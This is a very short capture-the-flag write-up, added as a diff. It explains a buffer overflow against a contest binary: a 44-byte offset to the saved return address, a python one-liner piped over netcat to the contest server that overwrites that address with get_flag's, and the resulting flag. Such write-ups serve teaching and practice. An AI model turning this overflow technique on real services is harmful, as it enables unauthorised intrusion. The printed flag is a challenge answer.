@@ -1,0 +1,7 @@
+After some experimentation, we find that we have 44 bytes
+until saved ret addr.
+Looking at the disassembly, there's a get_flag at 080484ad.
+
+python -c "print 'A'*44 + '\xad\x84\x04\x08'" | nc pwn.problem.sctf.io 1337
+
+flag{that_was_so_easy_i_wont_leetify_this_flag}
